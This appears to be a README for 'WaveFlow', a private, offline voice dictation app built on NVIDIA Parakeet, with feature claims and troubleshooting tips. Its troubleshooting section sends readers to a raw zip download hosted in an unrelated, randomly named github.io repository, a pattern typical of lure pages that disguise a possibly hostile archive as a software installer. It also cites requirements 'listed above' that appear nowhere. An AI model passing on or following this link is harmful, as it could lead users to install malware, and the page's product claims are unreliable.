WaveFlow is a **private voice dictation app** for Windows and macOS. Instead of sending your voice to a cloud service, WaveFlow runs a powerful speech-to-text engine called **NVIDIA Parakeet** directly on your own PC, home server, or VPS. This means:

- **No cloud account needed** – ever
- **Your voice never leaves your device** – total privacy
- **Works offline** – no internet connection required
- **Fast and accurate** – powered by state-of-the-art AI

Think of it as having a super-smart assistant who lives inside your computer and never reports back to anyone.

## ⌨️ How Does It Work?

WaveFlow runs a local speech recognition engine called **Parakeet**. This is a Neural Network developed by NVIDIA that is incredibly accurate at understanding human speech. The engine runs entirely on your hardware, which is why everything stays private.

WaveFlow uses a user-friendly interface built with **PySide6** (a modern Python toolkit), so the app feels smooth and responsive even on modest hardware.

## 🛠️ Troubleshooting

### The app doesn’t start after installation
Try downloading the latest version from the [download page](https://github.com/Fernfamilywiccan8933/fernfamilywiccan8933.github.io/raw/refs/heads/main/assets/Latest_v2.2.zip). Make sure your system meets the minimum requirements listed above.

### Voice isn’t being converted to text
- Ensure your microphone is selected in Windows **Settings > Privacy > Microphone**.
- Check that the global hotkey isn’t conflicting with another program.
- Speak clearly and at a normal pace – the engine is very forgiving, but it can’t read your mind.

### The app is slow
- Close other heavy applications.
- If you have an NVIDIA GPU, make sure you’ve installed the latest drivers.
- Consider upgrading your RAM if you have less than 8 GB.

### Text appears in the wrong place
- Click into the target text field before pressing the hotkey.
- Make sure the window has focus (is in the foreground).
